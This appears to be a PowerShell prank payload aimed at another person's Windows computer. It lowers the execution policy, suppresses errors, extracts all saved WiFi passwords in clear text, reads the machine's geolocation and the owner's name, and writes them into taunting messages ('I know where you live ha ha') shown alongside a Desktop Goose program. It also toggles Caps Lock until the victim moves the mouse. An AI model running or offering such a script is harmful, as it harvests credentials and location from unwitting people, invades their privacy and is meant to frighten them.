Set-ExecutionPolicy RemoteSigned -Scope CurrentUser

$ErrorActionPreference = 'SilentlyContinue'

function Get-wifi {
    try {
        $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
            $name = $_.Matches.Groups[1].Value.Trim()
            (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
                $pass = $_.Matches.Groups[1].Value.Trim()
                [PSCustomObject]@{ SSID = $name; PASS = $pass }
            }
        } | Format-Table -AutoSize | Out-String
    }
    catch {
        Write-Error "No WiFi profiles found"
    }

    $wifiMsg = @"
These are your WiFi passwords:
$wifiProfiles
"@

    $wifiMsg > $env:TEMP\hg\Assets\Text\NotepadMessages\wifi.txt
}

function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()

        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100
        }

        if ($GeoWatcher.Permission -eq 'Denied') {
            Write-Error 'Access Denied for Location Information'
        } else {
            $GeoLocation = $GeoWatcher.Position.Location | Select-Object Latitude, Longitude
            $Lat = $GeoLocation.Latitude
            $Lon = $GeoLocation.Longitude

            $GeoMsg = @"
I know where you live ha ha

Latitude: $Lat
___
Longitude: $Lon
___
"@
            $GeoMsg > $env:TEMP\hg\Assets\Text\NotepadMessages\location.txt
        }
    }
    catch {
        Write-Error "No coordinates found"
    }
}

function Get-email {
    try {
        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
        $emailMsg = @"
Can I email you at: 
$email ?
"@

        $emailMsg > $env:TEMP\hg\Assets\Text\NotepadMessages\email.txt
    }
    catch {
        Write-Error "An email was not found"
        return "No Email Detected"
    }
}

function Get-fullName {
    try {
        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
        "Hi $fullName" > $env:TEMP\hg\Assets\Text\NotepadMessages\name.txt
    }
    catch {
        Write-Error "No name was detected"
        "Hi $env:UserName" > $env:TEMP\hg\Assets\Text\NotepadMessages\name.txt
    }
}

function startGoose {
    Add-Type -AssemblyName WindowsBase
    Add-Type -AssemblyName PresentationCore

    $timeout = 180 # 2 minutes in seconds
    $stopTime = (Get-Date).AddSeconds($timeout)

    Start-Process $env:TEMP\hg\GooseDesktop.exe

    while (1) {
        $Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftCtrl)
        $Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightCtrl)

        if ($Rctrl -and $Lctrl) { powershell $env:TEMP\hg\CloseGoose.bat; exit }
        elseif ((Get-Date) -ge $stopTime) { powershell $env:TEMP\hg\CloseGoose.bat; exit }
        else { continue }
    }
}

function Target-Comes {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
            break
        } else {
            $o.SendKeys("{CAPSLOCK}")
            Start-Sleep -Seconds $pauseTime
        }
    }
}

Target-Comes
startGoose
